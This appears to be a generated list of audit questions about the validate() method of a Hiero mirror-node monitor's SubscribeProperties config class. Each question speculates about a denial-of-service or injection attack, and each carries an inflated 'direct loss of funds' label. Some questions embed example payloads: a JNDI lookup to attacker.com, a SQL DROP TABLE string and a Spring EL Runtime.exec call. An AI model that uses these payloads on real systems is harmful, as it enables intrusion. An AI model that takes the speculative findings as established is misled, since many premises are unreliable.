question: [File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/subscribe/SubscribeProperties.java -> Scope: Critical: Direct loss of funds'] [Function: validate()] Can an unprivileged external user set `statusFrequency` to exactly `Duration.ofSeconds(1)` (the `@DurationMin(seconds = 1L)` boundary) and configure 1024 scenarios, causing the `status()` method in `SubscribeMetrics` to iterate over 1024 scenarios every second, consuming 100% CPU and preventing the monitor from processing incoming subscription responses that would flag fund-draining transactions?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/subscribe/SubscribeProperties.java -> Scope: Critical: Direct loss of funds'] [Function: validate()] Can an unprivileged external user configure a `GrpcSubscriberProperties` with `topicId` set to an empty string that is not caught by `@NotBlank` due to a whitespace-only value, causing `GrpcSubscriber.createSubscriptions()` to call `expressionConverter.convert()` on a blank topic ID, resulting in a subscription to an invalid topic that never receives fund-transfer messages?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/subscribe/SubscribeProperties.java -> Scope: Critical: Direct loss of funds'] [Function: validate()] Can an unprivileged external user set `duration=Duration.ofSeconds(30)` (the minimum allowed by `@DurationMin(seconds = 30)`) in a `RestSubscriberProperties`, causing `RestSubscriber.clientSubscribe()` to terminate the subscription after 30 seconds via `.take(properties.getDuration())`, creating a recurring 30-second blind window during which fund-draining transactions are not verified?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/subscribe/SubscribeProperties.java -> Scope: Critical: Direct loss of funds'] [Function: validate()] Can an unprivileged external user configure a `rest` scenario with `limit=1` (the minimum non-zero value passing `@Min(0)`), causing `RestSubscriber.clientSubscribe()` to terminate after verifying exactly one transaction via `.take(properties.getLimit(), true)`, leaving all subsequent fund-transfer transactions unverified?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/subscribe/SubscribeProperties.java -> Scope: Critical: Direct loss of funds'] [Function: validate()] Can an unprivileged external user supply a `grpc` map key containing JNDI expression syntax (e.g., `${jndi:ldap://attacker.com/x}`) that passes `StringUtils.isBlank` and `Sets.intersection` checks in `validate()`, and is then passed to `property.setName(name)` and subsequently used in log statements, triggering a Log4Shell-style RCE that compromises the monitor and disables fund-loss detection?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/subscribe/SubscribeProperties.java -> Scope: Critical: Direct loss of funds'] [Function: validate()] Can an unprivileged external user set `GrpcSubscriberProperties.retry.maxAttempts=Long.MAX_VALUE` (the default set in the constructor) combined with `minBackoff=Duration.ofMillis(100)` (the minimum), causing `GrpcSubscriber.clientSubscribe()` to retry at near-maximum rate on every error, generating billions of gRPC reconnection attempts that saturate the mirror node's connection limit and prevent legitimate clients from receiving fund-transfer notifications?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/subscribe/SubscribeProperties.java -> Scope: Critical: Direct loss of funds'] [Function: validate()] Can an unprivileged external user configure a `rest` scenario where `publishers` contains a name that exactly matches a legitimate publish scenario, but `samplePercent=0.0`, causing `shouldSample()` to pass the publisher filter but always fail the random check, so 100% of fund-transfer transactions from that publisher are silently dropped without verification?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/subscribe/SubscribeProperties.java -> Scope: Critical: Direct loss of funds'] [Function: validate()] Can an unprivileged external user set `enabled=true` at the top level but `enabled=false` on every individual `GrpcSubscriberProperties` and `RestSubscriberProperties`, causing `validate()` to pass (maps are non-empty) but `GrpcSubscriber.createSubscriptions()` and `RestSubscriber.createSubscriptions()` to produce empty subscription lists, resulting in zero active monitoring of fund transfers?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/subscribe/SubscribeProperties.java -> Scope: Critical: Direct loss of funds'] [Function: validate()] Can an unprivileged external user supply a scenario name of exactly 1 non-blank character that is a valid Prometheus label character, register it in both `grpc` and `rest` maps with different capitalizations to bypass `Sets.intersection`, and then exploit the resulting duplicate metric tag in `SubscribeMetrics` to cause a `MeterRegistry` collision that silently drops latency measurements for fund-transfer transactions?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/subscribe/SubscribeProperties.java -> Scope: Critical: Direct loss of funds'] [Function: validate()] Can an unprivileged external user configure a `GrpcSubscriberProperties` with `startTime` set to `Instant.EPOCH` (year 1970), causing the gRPC subscription to request all historical messages from the beginning of time, overwhelming the mirror node with a massive replay of old messages that buries current fund-transfer alerts in noise?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/subscribe/SubscribeProperties.java -> Scope: Critical: Direct loss of funds'] [Function: validate()] Can an unprivileged external user set `statusFrequency` to `Duration.ofSeconds(1)` and configure `clients=1024`, causing the `@Scheduled` `status()` method in `SubscribeMetrics` to acquire locks on 1024 concurrent metric objects every second, creating a deadlock scenario that freezes the monitor and prevents fund-loss alerts from being emitted?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/subscribe/SubscribeProperties.java -> Scope: Critical: Direct loss of funds'] [Function: validate()] Can an unprivileged external user inject a scenario name containing SQL injection syntax (e.g., `'; DROP TABLE transactions; --`) that passes `StringUtils.isBlank` in `validate()` and is stored as a metric tag, and if the monitoring system persists metrics to a database, cause the injected name to corrupt the metrics store and erase historical fund-transfer audit records?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/subscribe/SubscribeProperties.java -> Scope: Critical: Direct loss of funds'] [Function: validate()] Can an unprivileged external user configure a `rest` scenario with `timeout=Duration.ofMillis(500)` and `retry.maxAttempts=16` (the default), causing `RestSubscriber.clientSubscribe()` to retry 16 times with 500ms timeout each, spending up to 8 seconds per transaction verification, so high-frequency fund-transfer transactions queue up faster than they are verified and the backlog causes the reactive sink to drop events?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/subscribe/SubscribeProperties.java -> Scope: Critical: Direct loss of funds'] [Function: validate()] Can an unprivileged external user set `grpc` map to contain a scenario with a `topicId` expression that resolves to a topic owned by the attacker, and simultaneously set `rest` map to contain a scenario with `publishers` pointing to the same scenario name, causing the REST subscriber to verify transactions published to the attacker's topic instead of the legitimate fund-transfer topic?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/subscribe/SubscribeProperties.java -> Scope: Critical: Direct loss of funds'] [Function: validate()] Can an unprivileged external user supply a `rest` map with a scenario whose `publishers` set contains 10,000 entries (no size limit enforced), causing `RestSubscriber.shouldSample()` to perform a linear or hash lookup across 10,000 entries for every published transaction, creating O(n) overhead that slows transaction verification to the point where fund-theft transactions are never confirmed in time?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/subscribe/SubscribeProperties.java -> Scope: Critical: Direct loss of funds'] [Function: validate()] Can an unprivileged external user configure `clients=1024` and `subscribers=1024` in a single `GrpcSubscriberProperties`, causing the monitor to open 1024×1024 = 1,048,576 concurrent gRPC streams to the mirror node, triggering rate limiting or connection exhaustion on the mirror node side and preventing all other clients from receiving fund-transfer topic messages?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/subscribe/SubscribeProperties.java -> Scope: Critical: Direct loss of funds'] [Function: validate()] Can an unprivileged external user set `RetryProperties.minBackoff=Duration.ofMillis(100)` and `maxBackoff=Duration.ofMillis(500)` (both at their minimums) in a `RestSubscriberProperties`, causing `RestSubscriber.clientSubscribe()` to retry failed REST calls at maximum frequency, generating a flood of HTTP requests to the mirror node REST API that triggers rate limiting and blocks legitimate transaction verification queries?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/subscribe/SubscribeProperties.java -> Scope: Critical: Direct loss of funds'] [Function: validate()] Can an unprivileged external user configure a `grpc` scenario with `enabled=true` and a `rest` scenario with `enabled=true`, both with `limit=0` (unlimited) and `duration=Duration.ofNanos(Long.MAX_VALUE)`, causing both subscribers to run indefinitely and accumulate unbounded in-memory state in `SubscribeMetrics.durationMetrics` and `latencyMetrics` ConcurrentHashMaps, eventually causing an OOM crash that disables all fund-loss monitoring?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/subscribe/SubscribeProperties.java -> Scope: Critical: Direct loss of funds'] [Function: validate()] Can an unprivileged external user set a scenario name to a string that is valid in YAML/properties files but contains Spring EL expression syntax (e.g., `#{T(java.lang.Runtime).getRuntime().exec('cmd')}`), which is then passed to `property.setName(name)` in `validate()` and evaluated by Spring's expression engine, achieving RCE that disables the monitor and suppresses fund-loss detection?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/subscribe/SubscribeProperties.java -> Scope: Critical: Direct loss of funds'] [Function: validate()] Can an unprivileged external user configure a `rest` scenario with `samplePercent=1.0` but `publishers` set to an empty `LinkedHashSet`, causing `RestSubscriber.shouldSample()` to skip the publisher filter (because `publishers.isEmpty()` is true) and sample 100% of all published transactions regardless of scenario, creating a scenario where the attacker can flood the REST subscriber with high-volume benign transactions to exhaust the sink buffer and drop real fund-theft transaction verifications?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/subscribe/SubscribeProperties.java -> Scope: Critical: Direct loss of funds'] [Function: validate()] Can an unprivileged external user configure a `GrpcSubscriberProperties` with `topicId` containing a null byte (e.g., `0.0.1234\x00`), which passes `@NotBlank` validation but causes the gRPC client to send a malformed topic ID to the mirror node, resulting in an `INVALID_ARGUMENT` gRPC error that triggers `GrpcSubscriber.shouldRetry()` to return false and permanently stop the subscription without alerting operators?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/subscribe/SubscribeProperties.java -> Scope: Critical: Direct loss of funds'] [Function: validate()] Can an unprivileged external user set `grpc` map entries to 1024 scenarios each with `subscribers=1024` and `retry.maxAttempts=Long.MAX_VALUE`, causing `GrpcSubscriber.clientSubscribe()` to maintain 1,048,576 concurrent retry loops, each consuming a thread from the Reactor scheduler, exhausting all available threads and causing the monitor to deadlock and stop processing fund-transfer messages?
